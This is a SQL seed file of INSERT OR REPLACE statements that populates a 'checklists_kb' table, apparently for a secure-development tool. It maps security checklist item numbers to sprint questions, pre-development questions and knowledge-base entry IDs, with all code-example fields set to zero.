INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.4', 1, 3, 43, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('16.5', 19, 0, 112, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('16.6', 18, 0, 227, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('16.7', 9, 0, 138, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('16.8', 18, 0, 13, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('16.9', 0, 0, 194, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.1', 22, 0, 211, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.2', 22, 0, 212, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.3', 22, 0, 213, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.4', 22, 0, 214, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.6', 1, 3, 114, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.5', 22, 0, 215, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.6', 22, 0, 216, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.7', 22, 0, 217, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.8', 22, 0, 218, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.9', 22, 0, 219, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.10', 22, 0, 220, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('17.11', 22, 0, 221, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.1', 21, 0, 33, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.2', 21, 0, 187, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.7', 1, 3, 59, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.3', 21, 0, 175, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.4', 21, 0, 176, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.5', 21, 0, 197, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.6', 21, 0, 152, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.7', 21, 0, 224, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.8', 21, 0, 160, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.9', 21, 0, 195, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('18.10', 21, 0, 80, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.1', 0, 2, 14, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.8', 2, 3, 85, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.2', 0, 2, 102, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.3', 0, 2, 246, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.4', 0, 2, 106, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.5', 0, 2, 199, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.6', 0, 2, 237, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.7', 0, 2, 200, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.8', 0, 2, 238, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.9', 0, 2, 201, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('19.10', 0, 2, 223, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.1', 0, 1, 161, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.9', 2, 3, 86, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.12', 1, 3, 76, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.13', 1, 3, 51, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.16', 2, 3, 122, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.17', 2, 3, 243, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.18', 2, 3, 70, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.19', 0, 3, 63, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.20', 1, 3, 29, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.21', 1, 3, 65, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.22', 2, 3, 115, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.2', 0, 1, 162, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.23', 1, 3, 182, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.24', 2, 3, 87, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.25', 1, 3, 88, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.26', 1, 3, 233, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.27', 1, 3, 222, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.28', 1, 3, 165, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.29', 1, 3, 251, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.31', 1, 3, 231, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.32', 1, 3, 187, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.33', 1, 3, 209, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.3', 0, 1, 163, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.1', 1, 3, 132, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.2', 1, 3, 57, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.3', 1, 3, 60, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.4', 1, 3, 89, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.5', 1, 3, 90, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.6', 1, 3, 91, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.7', 2, 3, 58, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.10', 1, 3, 56, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.11', 1, 3, 55, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.4', 0, 1, 258, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.12', 1, 3, 92, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.16', 1, 3, 188, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.17', 1, 3, 253, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.18', 2, 3, 254, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.1', 0, 4, 126, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.4', 0, 4, 44, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.5', 0, 4, 61, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.8', 1, 4, 242, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.9', 1, 4, 240, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.5', 0, 1, 260, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.10', 1, 4, 258, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.11', 1, 4, 259, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.12', 1, 4, 232, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.13', 3, 4, 5, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.14', 3, 4, 116, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.14', 4, 4, 116, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.15', 2, 4, 111, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.16', 1, 4, 241, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.1', 0, 0, 146, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.3', 3, 0, 95, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.3', 4, 0, 95, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.3', 5, 0, 95, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.6', 0, 1, 172, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.5', 3, 0, 108, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.5', 4, 0, 108, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.5', 5, 0, 108, 0, 0, 0, 0, 'False', 'False');
